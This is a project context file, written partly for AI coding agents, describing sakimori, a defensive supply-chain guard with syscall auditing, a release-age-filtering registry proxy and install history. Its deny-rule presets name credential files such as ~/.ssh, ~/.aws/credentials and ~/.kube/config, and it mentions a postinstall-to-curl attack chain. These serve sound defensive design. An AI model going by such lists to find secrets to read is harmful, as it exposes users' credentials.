# CLAUDE.md — project context for Claude

This file exists so future Claude sessions (or other LLM agents) can
pick up work on this repo without re-deriving context from scratch.
Human readers may find it useful too — it's deliberately written in
plain English, no agent-only jargon.

## What this project is

**sakimori** is a cross-platform supply-chain guard with two main
surfaces:

1. **A supervised-run mode** for CI (`sakimori run -- <cmd>`):
   wraps your build/test command with an eBPF (Linux) or ETW (Windows)
   agent that audits and optionally blocks network / file / exec
   syscalls.
2. **A lockfile supply-chain guard** (`sakimori deps check` and
   `sakimori deps watch`): runs a "minimum release age" check across
   4 ecosystems (npm, cargo, pypi, nuget), flagging recently-published
   dependencies so you can sit out the window in which malicious
   releases typically live.

## Known limitations (read these before changing behaviour)

These are **accepted** limitations — not bugs. The architecture
has them on purpose, and the docs are honest about each.

### `deps watch` is detection, not prevention

The watch mode subscribes to FS events on lockfiles. It fires
*after* the package manager has finished writing the lockfile,
which means:

- **npm / pnpm / yarn**: `preinstall` / `install` / `postinstall`
  scripts have already executed by the time the lockfile changes.
  Any .ssh / env / crontab / launchd-service mischief from a
  malicious package **cannot be undone** by reverting the lockfile.
- **pypi (pip / uv / poetry)**: `setup.py` / build-backend hooks
  execute during install. Same story as npm.
- **cargo / dotnet**: the initial `add`/`restore` just updates
  the lockfile and extracts the crate — code doesn't run until
  the next `cargo build` / `dotnet build`. In principle watch has
  a window between those two points… **but** rust-analyzer,
  OmniSharp, file-save hooks in IDEs, and other background
  tooling often invoke the build automatically, closing that
  window quickly. In practice: treat cargo/dotnet the same as
  npm/pypi for threat-model purposes.

**Practical consequence**: `deps watch` is most useful as a
passive audit alarm ("hey, you just pulled in a 2-hour-old crate")
rather than as a wall against script-based attacks. The only way
to reliably *prevent* those is to check BEFORE install happens
(see `deps check` in CI, or the planned `install-gate` wrapper).

### Auto-fallback (pnpm-style): crates.io only, via the proxy

pnpm 10.x's `minimumReleaseAge` teaches its resolver to **filter
versions younger than the threshold out of its candidate set**,
silently resolving to the newest in-range version that also meets
the age requirement. Builds don't break; they just use slightly
older deps.

**Status (v0.17):**
- **crates.io** — ✅ implemented via the proxy. `sakimori
  proxy serve` rewrites `index.crates.io` sparse-index responses on
  the fly, dropping JSONL lines whose `(name, vers)` publish time is
  < `--min-age`. cargo's resolver sees only acceptable versions and
  naturally picks the newest older-in-range.
- **npm** — ✅ implemented. The proxy rewrites the packument
  endpoint (`registry.npmjs.org/<pkg>`): too-young entries are
  removed from both `versions` and `time`, and any `dist-tags`
  (notably `latest`) that pointed at a removed version is
  retargeted to the highest remaining semver. npm's resolver then
  picks the newest in-range surviving version — no error.
- **pypi** — ✅ implemented for all three metadata shapes pip / uv /
  legacy tools consult:
  - Warehouse JSON API (`pypi.org/pypi/<pkg>/json`) — drops version
    keys from `releases` whose earliest `upload_time_iso_8601` is
    too young, plus stripping the `urls` shortcut.
  - PEP 691 Simple JSON (`pypi.org/simple/<pkg>/` with
    `Accept: application/vnd.pypi.simple.v1+json`) — drops
    too-young `files[]`, prunes `versions[]` to only those with
    surviving files.
  - PEP 503 Simple HTML (`pypi.org/simple/<pkg>/` with
    `Accept: text/html`) — carries no inline publish time, so the
    rewriter consults an out-of-band lookup to the Warehouse JSON
    API via `PypiSimpleClient` (cached per-package for 10 min).
    Anchors whose filename-derived version is too young are dropped
    byte-for-byte from the HTML; surrounding markup is preserved so
    pip's tolerant parser sees the exact same document minus the
    filtered rows. Failed lookups yield an empty map → fail-open,
    but pinned `files.pythonhosted.org` fetches still hard-deny at
    the tarball layer.
- **nuget** — ✅ implemented for the **registration** endpoints
  (`api.nuget.org/v3/registration<X>*/<id>/index.json` and the
  paged `.../page/<lower>/<upper>.json`). Leaves whose
  `catalogEntry.published` is too young are dropped from every
  page's `items[]`; `count` fields are rewritten so they stay
  consistent. Pages that reference a separate URL instead of
  carrying inline items are left alone — the re-fetch is a new
  request and goes through the same rewriter.

  The **flat-container index** (`/v3-flatcontainer/<id>/index.json`
  — a plain `{"versions":[...]}` with no dates) is silently filtered
  via an out-of-band lookup to the registration endpoint. The
  `NugetFlatContainerClient` fetches
  `/v3/registration5-semver1/<id>/index.json`, extracts version→
  publish-time pairs (walking page references up to a bounded
  depth), caches the map per-package for 10 minutes, and feeds the
  rewriter's oracle. Failed lookups yield an empty map → fail-open,
  but pinned `.nupkg` fetches still hard-deny at the tarball layer
  so stale cache can't silently admit young versions.

For ecosystems without rewriting, `deps check` (CI) or the proxy's
hard-deny (desktop) is still the defense — just not silent.

### file block is "tripwire", not pre-open block

On Linux, `file.deny` in `mode: block` triggers
`bpf_send_signal(SIGKILL)` on the process that opened a
matching file. The file descriptor may briefly exist; the
process dies before it can consume its contents. This is
honest "after-the-open block" — for a truly pre-open block we
need `bpf_override_return` on a kprobe'd `do_sys_openat2`, which
is CONFIG_BPF_KPROBE_OVERRIDE dependent. Roadmap.

### exec block is audit-only

`process.deny_exec` stamps `denied: true` on matching events and
makes block-mode exit non-zero, but the child process does exec.
See above about `bpf_override_return`.

### Windows network default:deny is audit-only

Windows Defender Firewall evaluates block rules as winning over
allow. An "allowlist" pattern (`default: deny` + `allow: […]`)
would require flipping the system-wide default-outbound to Block,
which we won't do silently on a shared runner. `network.deny` is
kernel-enforced; `network.default: deny` is audit-only + warn.

## Custom / internal registries

The proxy's per-ecosystem rewriters + lifecycle gate dispatch by
**hostname**: traffic to `registry.npmjs.org` runs the npm packument
rewriter, traffic to `pypi.org` runs the PyPI rewriters, etc. By
default only the canonical public hosts are watched. Teams that route
installs through an internal mirror (Verdaccio, GitHub Packages,
Artifactory, Takumi Guard, JFrog, Nexus, …) need to teach the proxy
about those hosts; otherwise traffic to e.g.
`https://npm.flatt.tech/` passes through opaquely and none of the
release-age / lifecycle defences fire.

The configuration surface lives in `sakimori-proxy::RegistryHosts`
(`crates/sakimori-proxy/src/registries.rs`) with three layered
sources, applied in this order with case-insensitive dedupe:

1. Built-in defaults (the canonical public host per ecosystem — always
   in).
2. Optional TOML config: `--registries-config <FILE>`. Schema:

   ```toml
   [registries]
   npm           = ["registry.npmjs.org", "npm.flatt.tech"]
   pypi_index    = ["pypi.org"]
   pypi_files    = ["files.pythonhosted.org"]
   crates        = ["crates.io"]
   crates_sparse = ["index.crates.io"]
   nuget         = ["api.nuget.org"]
   ```

3. Per-ecosystem CLI flags on `sakimori proxy start` (repeatable):
   `--npm-registry`, `--pypi-registry`, `--pypi-files-host`,
   `--cargo-registry-host`, `--cargo-sparse-host`, `--nuget-registry`.
   Each accepts a bare hostname or a URL whose host is extracted
   (`https://npm.flatt.tech:8443/` → `npm.flatt.tech`).

The proxy then constructs parsers via
`parser::parsers_from_hosts(&RegistryHosts)`; `classify_response`
consults the same struct so the npm packument rewriter / PyPI index
rewriter / NuGet registration rewriter / crates sparse-index
rewriter / lifecycle gate fire on every configured host of the
right ecosystem.

**What does NOT switch by hostname** (yet, see Roadmap if applicable):

- **URL path shape**. The custom host must serve the canonical
  registry's URL shape (npm: `/<pkg>` packument + `/<pkg>/-/
  <pkg>-<ver>.tgz` tarballs; PyPI Warehouse JSON / PEP 503/691
  Simple index; NuGet v3 registration + flat-container; cargo sparse
  index). A mirror that exposes a different shape (e.g. an
  Artifactory repo at `/artifactory/api/npm/<repo>/`) needs a path-
  prefix-aware variant of the parser — not implemented.
- **Tarball pin URLs in the npm packument**. When the rewriter
  retargets `dist-tags.latest` or surfaces strip-mode integrity
  values, it edits the upstream's own `dist.tarball` URL byte-for-
  byte; the URL host is whatever the upstream packument said, so
  internal mirrors that rewrite `dist.tarball` to themselves keep
  doing so transparently. No change required.
- **OSV-mirror / typosquat-mirror**. These are sakimori-hosted
  metadata feeds, not package registries; they have their own
  `--osv-mirror-url` / `--typosquat-mirror-url` flags.

Egress filtering (`--network-allow`) is orthogonal and stacks
naturally: to lock the proxy to *only* internal mirrors and forbid
the canonical public hosts, list the internal hosts under
`--network-allow` and the public ones won't survive the default-deny.

## Roadmap (what to build next, in priority order)

1. **`sakimori install-gate`** — ✅ implemented in v0.19. Three
   subcommands:
   - `shellenv` — emits a shell-specific snippet that exports
     `HTTPS_PROXY` + `CARGO_HTTP_CAINFO` / `PIP_CERT` /
     `NODE_EXTRA_CA_CERTS` / `REQUESTS_CA_BUNDLE` / `SSL_CERT_FILE`
     pointing at the proxy's CA bundle, so tools that don't honour
     the system trust store still validate the MITM certs.
   - `install` — appends `eval "$(sakimori install-gate shellenv)"`
     to the detected shell rc file, bracketed with idempotent
     sentinels so repeated runs don't duplicate.
   - `uninstall` — strips the block.

   After this, every `npm install` / `cargo add` / `pip install` /
   `dotnet add package` in a new shell routes through
   `sakimori proxy`. Because the proxy now does pnpm-style
   silent fallback for all four ecosystems (v0.15–0.18), the user
   sees no error on "install something young" — they just get the
   newest safe version. For an unhandled path or a tarball pin to
   a young version, the proxy returns 403 and the install stops.

   Caveat: the proxy has to be running. `install-gate install`
   prints a reminder; long-term we'll wire launchd / systemd
   user units so the proxy auto-starts.
2. **HTTPS registry proxy** — same idea but transparent: set
   `HTTPS_PROXY` system-wide, filter fetch traffic. No shell
   aliasing required, but MITM cert management is a UX chore.
3. ~~**NuGet flat-container auto-fallback**~~ — done.
   `NugetFlatContainerClient` fetches the registration endpoint
   out-of-band, caches the version→publish-time map per package,
   and feeds the flat-container rewriter. All four ecosystems
   now have silent fallback.
4. **Linux file/exec block via `bpf_override_return`** — clean
   pre-syscall block, requires runtime detection of
   CONFIG_BPF_KPROBE_OVERRIDE and a well-timed kprobe.
   Partial progress (v0.37): `crate::kprobe_override::detect()`
   reads `/boot/config-$(uname -r)` and reports
   `Available` / `Unsupported` / `Unknown` so the rest of the
   loader can light up the kprobe path opportunistically, and
   `sakimori doctor` surfaces a "Kernel pre-syscall block" row
   with strength-aware messaging (the warn path explicitly
   reassures users that the existing SIGKILL tripwire is still
   in effect). The kprobe BPF program + attach path is the
   next slice.
4b. **Lift the `FILE_DENY_MAX_ENTRIES = 8` cap.** The 8-entry
    ceiling is not an algorithmic limit — it's the verifier-budget
    fallout of fully unrolling `file_deny_matches` in
    [crates/sakimori-ebpf/src/main.rs:203](crates/sakimori-ebpf/src/main.rs)
    (8 entries × `FILE_DENY_PREFIX_LEN` bytes of inner compare,
    all inlined). Today this forces every `policy preset` to
    triage which 8 prefixes matter (e.g. `persistence` covers
    `.ssh` but cannot add `~/.aws/credentials`, `~/.kube/config`,
    `~/.config/op/` in the same pack). Three viable lifts, listed
    in increasing payoff:
    - **Bounded loop (kernel ≥ 5.3)** — drop the unroll, let the
      verifier handle a real loop. Cheapest diff, but still O(N)
      per open and verifier budget regrows with N — buys maybe
      32–64 entries, not 1000s.
    - **`BPF_MAP_TYPE_LPM_TRIE`** — replace the linear-scan Array
      with an LPM trie keyed on the path prefix. Lookup becomes
      O(path_len) regardless of rule count, so the cap effectively
      disappears (map `max_entries` becomes the only limit, and
      that's a userspace tunable). Side benefit: trie keys are
      already prefix-shaped, so `*.example`-style suffix matching
      falls out naturally if we reverse the byte order on insert.
      Recommended path.
    - **Shrink `FILE_DENY_PREFIX_LEN`** — orthogonal stop-gap; only
      helps if the current prefix length is much larger than the
      median deny rule. Doesn't change asymptotic shape.

    Pairs with the `persistence` preset (Roadmap #16) — once the
    cap is gone, that preset can grow to cover the full cloud-
    credential file set (`~/.aws/credentials`,
    `~/.aws/config`, `~/.kube/config`, `~/.config/op/`,
    `~/.docker/config.json`, `~/.netrc`, `~/.config/gh/hosts.yml`,
    `~/.npmrc`) without dropping `.ssh`/LaunchAgents. The macOS
    Endpoint Security path (#5b) has no equivalent limit — policy
    list length is the only bound — so this lift only unblocks
    Linux parity, but Linux is where most CI runs anyway.

4c. **Per-process file-access policy** (scope `file.*` rules to a
    specific process, not the whole host). Today file rules are
    path-only (`FilePolicy { default, allow: Vec<String>, deny:
    Vec<String> }` in
    [crates/sakimori-core/src/policy.rs](crates/sakimori-core/src/policy.rs)
    — no `comm`/`exe`/`pid`/attribution field on the rule), and
    enforcement is a **global** `sakimori_openat` raw tracepoint
    ([crates/sakimori-ebpf/src/main.rs](crates/sakimori-ebpf/src/main.rs))
    that fires for every process on the box — so a `file.deny`
    cannot be confined to "just the supervised child" the way the
    cgroup-scoped `connect4/6` network hooks already are. Attribution
    (#11/#19) is userspace-after-the-fact (`/proc` PPid walk in the
    drain task) and so can label but **cannot gate** the kernel
    decision. The motivating use case: confine an **AI coding agent**
    (or any single process) so it cannot read secret files —
    "process A: deny read of `~/.ssh`, `~/.aws/credentials`, …;
    everyone else on the host unaffected." Not expressible today.

    The capability is feasible on all three platforms — none has a
    hard blocker, only different primitives:
    - **Linux**: move file enforcement off the global tracepoint onto
      a **BPF-LSM `file_open` hook** (kernel ≥ 5.7,
      `CONFIG_BPF_LSM=y`). Two wins in one: the LSM hook can `return
      -EACCES` for a true **pre-open** deny (the clean version of #4's
      `bpf_override_return` for files), *and* it runs with `current`
      in context so it can filter by cgroup id / pid before deciding —
      i.e. scope a deny to the supervised cgroup or a specific exe.
      Resolve the "is this the target process" check kernel-side via a
      BPF map keyed on cgroup id (populated by the supervisor at
      attach time) rather than the userspace PPid walk. Add an
      optional `process:` selector to the file-rule struct
      (`comm` / `exe` basename / attribution-root); empty selector =
      today's whole-scope behaviour, preserved. Pairs with #4
      (pre-syscall block), #4b (LPM trie so the per-process path set
      isn't bound by the 8-entry cap), and #19 (attribution roots
      already recognise `code`/`cursor`/agent binaries). Fallback for
      kernels without BPF-LSM: keep the SIGKILL tripwire but gate it
      on a cgroup-id map check so it at least scopes to the child.
    - **macOS**: rides roadmap #5b's Endpoint Security client.
      `ES_EVENT_TYPE_AUTH_OPEN` is deadline-bound and carries the
      `audit_token_t` → per-process by exe / signing id, and an AUTH
      deny is a genuine pre-open block. ES has no per-process-count
      limit, so the secret-file set isn't capped the way Linux's eBPF
      array is.
    - **Windows**: ETW is observe-only, so a true read block needs a
      **minifilter file-system filter driver** (`IRP_MJ_CREATE`
      pre-callback) that denies by process id / image name. Heaviest
      of the three (signed kernel driver, WHQL/EV-signing onboarding)
      → lowest priority, but not impossible; the Defender-Firewall
      split in `sakimori-win` is the precedent for "Windows needs its
      own enforcement primitive".

    Honest scope: this overlaps with OS sandboxes (Linux **Landlock**,
    macOS `sandbox-exec`/seatbelt, containers that simply don't mount
    the secret into the agent's namespace) — those are the
    off-the-shelf way to confine one process today. sakimori's
    value-add is *unifying* it with the same `policy.yml` + attribution
    + JSON-log / step-summary / HTML-report surface the rest of the
    tool already speaks, and tying the file-confinement signal to the
    fetch-layer + exec attribution in one report. First slice should be
    Linux BPF-LSM + the `process:` selector; macOS follows #5b;
    Windows is a separate driver track.

5. **macOS live block** — either a Network Extension (heavy, needs
   signing) or an HTTPS proxy (see #2).
5b. **macOS supervised mode (exec + file attribution via Endpoint
    Security)** — Linux has eBPF tracepoints + PPid-walk attribution
    (v0.23) and Windows has ETW, but macOS today only sees installs
    via the proxy. The matching primitive on macOS is the
    **Endpoint Security framework** (`<EndpointSecurity/
    EndpointSecurity.h>`), which delivers `ES_EVENT_TYPE_NOTIFY_EXEC`
    / `..._FORK` / `..._OPEN` / `..._WRITE` with full
    `audit_token_t` + parent pid + signing info — i.e. the same
    "npm → sh → node postinstall → curl" chain sakimori currently
    reconstructs from `/proc` on Linux, available natively without a
    PPid walk. Required pieces:
    - A separate signed binary with the
      `com.apple.developer.endpoint-security.client` entitlement
      (Apple-issued, gated approval — non-trivial onboarding cost,
      same gate Jamf / CrowdStrike / SentinelOne pass through).
      Notarised + Developer ID signed; the SystemExtension lives
      under `/Library/SystemExtensions/` and the user has to approve
      it once in System Settings → Privacy & Security.
    - ES client subscribes to NOTIFY-class events for the
      audit/observability path; AUTH-class events
      (`ES_EVENT_TYPE_AUTH_EXEC`, `..._AUTH_OPEN`) are what would let
      us *block* (the macOS analogue of `bpf_override_return`),
      paralleling roadmap #4. AUTH responses are deadline-bound
      (~tens of ms) so the policy match has to stay hot-path-cheap.
    - Bridge into `sakimori-core::events` so JSON-log + step-summary
      + HTML report reuse the existing shapes; attribution becomes
      "read the responsible/parent audit_token directly" rather than
      walking `/proc`.
    - Packaging: ship as a separate `sakimori-mac` crate (mirrors
      `sakimori-win`'s split) so ES bindings + Objective-C runtime
      deps don't leak into the Linux build.
    - Out of scope for the first slice: AUTH-mode pre-syscall block
      (start with NOTIFY-only audit, same staging Linux did before
      `bpf_send_signal`); container/VM-hosted installs (ES sees only
      the host); per-script *content* inspection (proxy-side
      lifecycle gate #15 already covers that and is OS-agnostic).
    Pairs with #5 (HTTPS proxy live block) the way Linux pairs
    network eBPF with file/exec eBPF — proxy handles "what was
    fetched", ES handles "what ran and what it touched".
6. **Retroactive CVE notification for past installs** — local-first
   half landed: the proxy's pinned-install path now appends every
   resolved fetch to `~/.sakimori/installs.jsonl`
   (`InstallEvent { ecosystem, name, version, resolved_at,
   execution_mode, user_agent, git? }` — `project_path` and richer
   attribution come next; the optional `git: GitProvenance { url,
   requested_ref, resolved_commit, commit_source }` block carries
   git-fetch traceability when `ecosystem == "git"`, populated by
   the github.com / codeload.github.com / api.github.com URL
   classifier in `sakimori_proxy::git_fetch`. Covers `npm install
   github:owner/repo` (codeload tarballs), `cargo`'s `git = "..."`
   and `pip install git+https://...` (clone-protocol discovery at
   `<repo>.git/info/refs?service=git-upload-pack`), and REST
   tarball/zipball fetches. When the URL ref is a 40-hex SHA the
   classifier records it as `resolved_commit` with
   `commit_source: "url"`; tag/branch refs leave
   `resolved_commit` unset and the follow-up via codeload's
   `ETag` header / git-upload-pack pkt-line parsing is the
   tracked next slice). Git events are skipped by `deps check`
   (no publish-time semantics), OSV scan (no clean ecosystem
   mapping for arbitrary repo URLs), and typosquat lookups — the
   value is post-hoc auditing of "what was actually fetched", not
   age-gating. `sakimori advisories scan` reads
   that log, dedupes by `(eco, name, version)`, and batch-queries
   [OSV.dev](https://osv.dev)'s `POST /v1/querybatch` for matching
   advisories. Hits exit non-zero so it slots into cron / CI.
   `execution_mode` classification is currently best-effort from
   the User-Agent (`npx` / `pipx` / `uvx` / `cargo-install` →
   ephemeral; known package managers → persistent; everything
   else → unknown). The proxy logger is on by default; opt out
   with `sakimori proxy start --no-install-log`. Local-first: no
   server, no upload, private dep trees never leave the machine —
   only `(eco, name, version)` tuples are sent to OSV.

   For team-wide push notifications, we ship **`sakimori-hub`** as
   an optional self-hostable companion: a small Rust service with
   a native `POST /ingest` endpoint that accepts the
   `InstallEvent` JSON schema, keeps an OSV mirror, runs the
   advisory-vs-install JOIN server-side, and dispatches webhooks
   / email / Slack when a past install matches a newly-published
   advisory. It is **strictly opt-in self-host** — there will be
   no Anthropic/coronarium-operated instance. Centralised SaaS
   remains out of scope; sakimori-hub is "here's the server you
   can run yourself if you want push notifications across a team."

   > **`sakimori-hub` lives in a separate repo: `bokuweb/sakimori-hub`
   > (sibling directory `../sakimori-hub` in local checkouts).** Do
   > NOT add hub code to this repo — the hub has its own deploy
   > target (Cloudflare Workers + D1 + R2 + Queues, IaC via
   > Alchemy v2), its own deps (WASM-compatible — `worker-rs`,
   > argon2, ed25519-dalek), and its own Cargo workspace. This repo (`sakimori`) only describes the
   > `InstallEvent` wire shape the hub consumes and the
   > `bokuweb/sakimori@v0` action that emits it; the hub
   > implementation, schema, and migrations belong to the hub repo.
   > A previous PR (#76) added `crates/sakimori-hub` here by
   > mistake and was reverted — if a future change tempts you to
   > re-add it, stop and open it in the hub repo instead.

   **Install inventory (`/ingest` + query API)** — beyond the
   advisory-JOIN path above, sakimori-hub is also the natural home
   for a **team-wide installed-package inventory**: every
   `InstallEvent` that hits `/ingest` is durably stored
   (`(ecosystem, name, version, resolved_at, execution_mode,
   user_agent, project_path, source)` with `source` ∈
   `{actions, desktop}` (hub-side derived; ambiguous events bias
   toward `actions` so a compromised CI runner can't dodge
   CI-scoped alerts by spoofing `desktop` — see the hub repo's
   `docs/port-from-sakimori-pr76.md` §2.1) derived from a
   hub-side classifier on `user_agent` / `project_path`), and a small read API
   (`GET /installs?ecosystem=&name=&since=&source=`) plus a
   minimal HTML inventory view answer "**who installed `<pkg>@
   <ver>` and when, across CI and developer laptops**". Both
   surfaces (Actions runners via `bokuweb/sakimori@v0` and desktop
   via `sakimori install-gate install`) already route installs
   through the same proxy, so the same `InstallEvent` schema
   covers both with no extra wiring on the client. The inventory
   is the foundation the advisory-JOIN dispatcher reads from —
   landing the storage half first means "what's in our supply
   chain?" becomes answerable even before the dispatcher ships.
   Retention default is 18 months (long enough to catch the
   advisory disclosure tail without unbounded growth); operators
   can override.

   This is also the layer that makes the **ephemeral-execution
   history searchable**: `npx`/`uvx`/`pipx run`/`cargo install`
   leave no lockfile trace, so without hub storage there is no
   way to answer "did anyone on the team run `<malicious-pkg>`
   in the last 90 days?". Dependabot/Snyk/Socket are
   lockfile-scoped and structurally cannot. With hub +
   `execution_mode: ephemeral`, they can.

   On top of (not instead of) the native `/ingest`, the proxy
   also offers an **opt-in OTLP exporter** — ✅ implemented in
   v0.36 — via `sakimori proxy start --otlp-endpoint <url>` plus
   repeatable `--otlp-header K=V` for vendor auth. Every allowed
   install is dispatched as an OTLP/HTTP **JSON** `LogRecord`
   carrying `package.*` attributes (`package.ecosystem`,
   `package.name`, `package.version`, `package.resolved_at`,
   `package.execution_mode`, plus `package.project_path` /
   `package.user_agent` when present). Dispatch is fire-and-forget
   on a `spawn_blocking` worker so a slow / unreachable collector
   never blocks an install; failures are `log::warn!`-only. The
   user passes the full URL (typically `…/v1/logs`) — sakimori
   does not auto-suffix because collectors may mount OTLP on a
   custom path. The two transports coexist: pick `/ingest` for
   advisory push notifications, OTLP for general observability,
   both for either.

   **Semantic-convention honesty.** The OTLP **envelope** (the
   `resourceLogs[].scopeLogs[].logRecords[]` shape, `timeUnixNano`
   as a decimal string, `severityNumber` in the 1..24 enum range,
   `AnyValue` variants, `service.name` / `service.version` on the
   resource) follows OTLP/HTTP JSON exactly — any spec-compliant
   collector parses it. The **`package.*` attribute keys are
   sakimori-specific**, not OpenTelemetry semantic conventions:
   OTel has no registered "package install event" attribute set
   yet, so we use our own namespace. If/when semconv ships an
   official equivalent (`software.package.*`?) the exporter will
   add it alongside (not replace `package.*`, to keep existing
   dashboards working). Don't claim "semconv compliant" — claim
   "OTLP-wire compliant, custom attribute namespace".

   The envelope claim is enforced by
   [crates/sakimori-proxy/tests/otlp_proto_roundtrip.rs](crates/sakimori-proxy/tests/otlp_proto_roundtrip.rs):
   it round-trips the exporter's output through
   `opentelemetry-proto`'s generated `ExportLogsServiceRequest`
   type, which carries the canonical OTLP field set + proto3→JSON
   name mapping. Any future regression that emits a non-OTLP
   shape (int64 as JSON number, wrong AnyValue variant key,
   unknown severity, …) trips that test before reaching CI's
   slower mock-HTTP `proxy_otlp_e2e.rs`. Running a real
   `otel/opentelemetry-collector-contrib` in CI is roadmap
   (Docker cost + signal-to-noise) — the proto round-trip is
   the lightweight stand-in.

   **npx** works for free here (same `registry.npmjs.org` path
   the npm rewriter already handles); **Homebrew** does *not* fit
   minimumReleaseAge (formula updates are PRs to a git repo, not
   registry publishes with structured publish-time per version)
   but its installs can still be logged via HTTPS_PROXY for the
   advisory-scan side.

   **`InstallEvent.execution_mode`** — the schema distinguishes
   two install shapes, because retroactive CVE notification means
   different things for each:

   - `persistent` (`npm install`, `cargo add`, `pip install`,
     `dotnet add package`, etc.) — the package lands in a lockfile
     and stays there. Advisory notification → "bump and re-install"
     remediation. Standard SCA model.
   - `ephemeral` (`npx`, `pnpm dlx`, `yarn dlx`, `uvx`,
     `pipx run`, `cargo install`, `go run <remote>`, etc.) — the
     package is fetched, executed once, and (often) cached but not
     pinned in any project lockfile. Advisory notification cannot
     mean "bump"; it means **"this code ran on your machine on
     <date> with the running user's privileges — investigate
     potential compromise"**. The host UI must surface these
     differently (different colour / different recommended action)
     so reviewers don't try to "fix" them by editing a lockfile
     that doesn't reference them.

   Classification happens at proxy time from the User-Agent and
   the URL path shape (e.g. `npm` UA + a fetch under
   `/<pkg>/-/<pkg>-<ver>.tgz` without a preceding packument GET
   pattern matching a project resolution → `ephemeral`; same fetch
   following a packument GET from `node` + `npm-cli` context →
   `persistent`). When ambiguous, default to `persistent` and let
   the host UI mark it `mode: unknown` rather than mis-categorise
   as ephemeral and hide a real dependency.

   This is one of sakimori-hub's strongest differentiators —
   Dependabot / Snyk / Socket only see what's committed to a repo
   lockfile, so they fundamentally cannot notify on `npx` /
   `pipx run` / `cargo install` history. sakimori is positioned
   at the fetch layer, so it can.

   **Competitive landscape note**: no shipped product covers all
   four axes simultaneously — *package-aware* + *execution
   history* + *developer endpoint* + *retroactive advisory JOIN*.
   SCA tools (Snyk / Socket / Phylum / Dependabot) are
   package-aware but lockfile-scoped, so ephemeral runs are
   invisible. EDR / XDR (CrowdStrike, SentinelOne, Defender for
   Endpoint, Elastic Security) record every exec but see only
   `node` + argv, not "this was `npx leftpad@1.2.3`" — the
   advisory→exec correlation is manual threat-hunting, not a
   product feature. Registry firewalls (Sonatype Nexus Firewall,
   JFrog Xray) sit at the right layer but target enterprise
   artifact repos, not developer laptops. The gap exists because
   SCA is repo-bound and EDR's abstraction stops at the process
   tree; bridging them needs a fetch-layer agent on the endpoint,
   which is exactly where sakimori already lives.

   **Alert-fatigue caveat** (don't ship this naïvely): if every
   low-severity advisory triggers a "you may have executed this 3
   weeks ago" notification, the signal drowns immediately. The
   ephemeral-mode notifier must be gated on at least:
   (a) severity ≥ High or known-exploited (KEV / GHSA `actively
   exploited`),
   (b) the advisory implicates install-time or run-time code paths
   (postinstall script, build-backend hook, or RCE in the imported
   surface — not e.g. a ReDoS in a code path the one-shot never
   touched),
   (c) package-popularity / typosquat heuristics to deprioritise
   obvious noise.
   These filters should be tunable and default conservative; the
   "investigate compromise" framing is high-cost-per-alert and
   loses credibility fast if it cries wolf.

### harden-runner parity gaps (tracked but not yet scheduled)

These are features `step-security/harden-runner` ships that
coronarium currently does not. Listed roughly in descending order
of value-per-implementation-cost.

6. **Enriched `$GITHUB_STEP_SUMMARY`** — ✅ implemented in v0.20.
   The supervisor now writes per-host (Connect), per-path (Open),
   and per-binary (Exec) top-N tables into the step summary,
   marking denied rows with ❌ so reviewers can spot the offending
   destinations directly on the run page without downloading the
   JSON log.
7. **`coronarium policy suggest <audit-log.json>`** — ✅ implemented
   in v0.20. Reads a JSON audit log (typically produced by an
   audit-mode run) and emits a starter `policy.yml` with every
   observed host/port pair on `network.allow`, observed file
   parents on `file.allow`, and observed exec'd binaries listed
   under a commented `# observed_exec` block. Reduces the "stare
   at the log and hand-craft the policy" friction that today
   blocks teams from flipping `mode: audit` → `mode: block`.
8. **SNI / hostname-based egress in the proxy** — ✅ implemented
   in v0.33. New `--network-allow <pattern>` (repeatable) and
   `--network-allow-file <path>` flags on `sakimori proxy start`
   configure a default-deny hostname allow-list enforced at
   `handle_request`. CONNECT requests pull the target from
   `req.uri().authority()`; plain HTTP from the `Host:` header; a
   missing Host with the policy active is treated as deny (no
   silent slip-through). Pattern grammar in `host_allow.rs`:
   `host.example.com` (exact, case-insensitive), `*.example.com`
   (any subdomain, excludes the apex by design); embedded `*` is
   a parse error. Off by default. Closes the eBPF-by-IP weakness
   against CDN rotation — every `*.githubusercontent.com` IP that
   happens to be live this minute resolves correctly because we
   filter by the SNI/Host name the client actually asked for.
9. **Workspace tamper detection** — ✅ implemented in v0.22 as
   standalone `coronarium workspace snapshot <dir>` +
   `coronarium workspace diff <baseline.json> <dir>`. Walks every
   regular file under the root, hashes with SHA-256, skips a
   hardcoded build-artefact list (`.git`, `node_modules`, `target`,
   `dist`, `build`, `vendor`, `__pycache__`, `.venv`, `venv`,
   `.next`, `.turbo`, `.cache` — deliberately not honouring
   `.gitignore`, since an attacker can write into it). Symlinks are
   recorded by target string, not followed. Files over 64 MiB
   default to size-only entries (configurable). Diff exits non-zero
   on drift unless `--allow-drift`. Also wired into `sakimori run`
   via `--snapshot-workspace <DIR>` (v0.34): supervisor takes the
   baseline before exec'ing the supervised command, takes a fresh
   snapshot at exit, attaches the diff to the JSON log under
   `workspace_drift`, surfaces it as a "Workspace drift" section in
   the step summary, and (in `mode: block`) exits non-zero on any
   drift the same way denied events do.
10. **Floating-tag → SHA-pin static check** — ✅ implemented in v0.21
    as `coronarium actions audit <workflow.yml...>`. Walks every
    `uses:` in `jobs.<id>.steps[]` and `jobs.<id>.uses` (reusable
    workflow callers) and classifies each as Ok (40-char hex SHA,
    local action, or docker `@sha256:` digest), Warn (first-party
    `actions/*` / `github/*` with a mutable tag — risky but lower
    blast radius), or Error (third-party with a mutable tag/branch).
    Text + JSON output, `--strict` escalates Warn → Error. Opt-in
    Tag→SHA auto-resolution via `--resolve` (v0.34): `GithubResolver`
    hits `GET /repos/{o}/{r}/commits/{ref}`, caches per
    `(owner, repo, ref)`, surfaces the resolved SHA as `→ resolved:
    <sha>` in text mode and `resolved_sha` in JSON. Failures
    (rate-limit, removed action) populate `resolve_error` per
    finding without aborting the audit. Reads `GITHUB_TOKEN` from
    the env to lift the rate limit from 60/hour to 5000/hour.
11. **Per-step / per-PID source attribution** — ✅ implemented in
    v0.23. Linux drain task walks the PPid chain via
    `/proc/<pid>/{status,cmdline}` for each event and attaches an
    `attribution::Attribution` (full chain + first matching
    package-manager argv) to the event before it's stored in
    Stats. Recognised package managers: npm, pnpm, yarn, cargo,
    pip (incl. `pip3.x`), uv, poetry, dotnet, go, maven, gradle,
    bundler, composer. The supervisor's own pid is excluded from
    the chain. Surfaces in the JSON log as a `source` field on
    every event and in the step summary as a "Sources" top-N
    table grouping events by originating package manager — the
    "wait, what's `npm install foo@1.2.3` doing connecting to
    that?" answer harden-runner gives. Best-effort: if the event
    pid has already exited by drain time the attribution is
    `None` and the event is unaffected. Non-Linux supervisors
